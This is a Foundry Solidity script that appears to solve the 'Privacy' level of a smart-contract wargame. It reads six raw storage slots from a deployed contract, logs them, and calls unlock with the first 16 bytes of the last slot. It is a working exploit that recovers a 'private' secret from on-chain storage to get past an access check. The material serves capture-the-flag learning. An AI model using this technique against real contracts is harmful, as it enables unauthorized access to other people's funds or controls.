// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level12.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PrivacySolution is Script {
    Privacy public privacy =
        Privacy(0x5748a8dc62A4DA5E6180Aed1e5EdbfA919fac31c);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 value1 = vm.load(address(privacy), bytes32(uint256(0)));
        console.log("Value1:", uint256(value1));

        bytes32 value2 = vm.load(address(privacy), bytes32(uint256(1)));
        console.log("Value2:", uint256(value2));

        bytes32 value3 = vm.load(address(privacy), bytes32(uint256(2)));
        console.log("value3:", uint256(value3));

        bytes32 value4 = vm.load(address(privacy), bytes32(uint256(3)));
        console.log("value4:", uint256(value4));

        bytes32 value5 = vm.load(address(privacy), bytes32(uint256(4)));
        console.log("value5:", uint256(value5));

        bytes32 value6 = vm.load(address(privacy), bytes32(uint256(5)));
        console.log("value6:", uint256(value6));

        privacy.unlock(bytes16(value6));
        vm.stopBroadcast();
    }
}
